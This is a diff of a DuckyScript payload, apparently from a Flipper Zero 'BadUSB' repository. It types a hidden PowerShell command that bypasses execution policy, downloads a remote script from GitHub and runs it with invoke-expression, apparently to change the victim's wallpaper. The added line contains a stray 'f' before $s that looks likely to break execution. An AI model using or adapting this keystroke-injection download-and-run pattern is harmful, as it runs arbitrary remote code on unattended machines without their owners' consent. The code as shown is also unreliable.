@@ -1,12 +1,7 @@
 GUI r
 DELAY 500
 REM long version: -windowstyle hidden -NoProfile -noninteractive -executionpolicy bypass
-ALTSTRING powershell -w h -NoP -NonI -Exec Bypass $url='https://raw.githubusercontent.com/Wurmele/BadFlipper/main/resources/scrat_angry_1.png';$s=iwr https://raw.githubusercontent.com/Wurmele/BadFlipper/main/scripts/wallpaper_url/wallpaper_url.ps1?dl=1;invoke-expression $s;
+ALTSTRING powershell -w h -NoP -NonI -Exec Bypass $url='https://github.com/Wurmele/BadFlipper/blob/main/resources/s_a_1.png?raw=true';$s=iwr https://raw.githubusercontent.com/Wurmele/BadFlipper/main/scripts/wallpaper_url/wallpaper_url.ps1?dl=1;invoke-expression f$s;
 DELAY 500
 ENTER
-
-
-
-
-
 
